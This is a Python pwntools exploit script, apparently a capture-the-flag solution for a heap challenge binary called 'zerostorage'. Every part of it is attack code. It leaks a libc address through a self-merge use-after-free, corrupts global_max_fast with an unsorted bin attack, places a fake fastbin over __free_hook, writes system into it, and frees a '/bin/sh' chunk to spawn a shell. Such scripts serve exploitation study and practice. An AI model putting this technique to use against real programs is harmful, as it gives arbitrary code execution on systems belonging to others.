from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

target = process("./zerostorage")
gdb.attach(target)
raw_input("Begin...")

libc_bin = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

def insert(size, data):
    target.recvuntil("Your choice: ")
    target.sendline("1")
    target.recvuntil("Length of new entry: ")
    target.sendline(str(size))
    target.recvuntil("Enter your data: ")
    target.sendline(data)

def merge(index1, index2):
    target.recvuntil("Your choice: ")
    target.sendline("3")
    target.recvuntil("Merge from Entry ID: ")
    target.sendline(str(index1))
    target.recvuntil("Merge to Entry ID: ")
    target.sendline(str(index2))

def view(index):
    target.recvuntil("Your choice: ")
    target.sendline("5")
    target.recvuntil("Entry ID: ")
    target.sendline(str(index))
    target.recvline()

def edit(index, size, data):
    target.recvuntil("Your choice: ")
    target.sendline("2")
    target.recvuntil("Entry ID: ")
    target.sendline(str(index))
    target.recvuntil("Length of entry: ")
    target.sendline(str(size))
    target.recvuntil("Enter your data: ")
    target.sendline(data)

def delete(index):
    target.recvuntil("Your choice: ")
    target.sendline("4")
    target.recvuntil("Entry ID: ")
    target.sendline(str(index))

# Create two chunks, must prevent consolidate into forest
insert(0x20, "A" * 0x1f)    # 0
insert(0xfc, "B" * 0xfb)    # 1

# Merge 0 chunk with itself, use after free
merge(0, 0)                 # 2

# View chunk 2 to view unsorted bin ptr
view(2)

leak = u64(target.recv(8))
libc = leak - 0x3c4b78
global_max_fast = libc + 0x3c67f8
system = libc + libc_bin.symbols['system']
free_hook = libc + libc_bin.symbols['__free_hook']

log.info("Leak: " + hex(leak))
log.info("Libc: " + hex(libc))
log.info("Global_max_fast: " + hex(global_max_fast))
log.info("System: " + hex(system))

# Edit 2 to overwrite unsorted bin ptr, attack global_max_fast
edit(2, 0x20, "aaaaaaaa" + p64(global_max_fast-0x10) + "C"*0xf)

# /bin/sh to free later, insert triggers unsorted bin attack
insert(0x20, "/bin/sh\x00" + "D"*0x17) # 0

# Large fastbin, size appropriate for attack
merge(1, 1)                  # 3

# Fake fastbin over free hook
payload = p64(free_hook - 0x59)
payload += "A" * (0x1f7 - len(payload))

edit(3, 0x1f8, payload)

insert(0x1f8, "Q"*0x1f7)

# Overwrite free hook
payload2 = "\x00" * 0x49
payload2 += p64(system)
payload2 += "\x00" * (0x1f7 - len(payload2))

insert(0x1f8, payload2)       # 4

delete(0)

target.interactive()
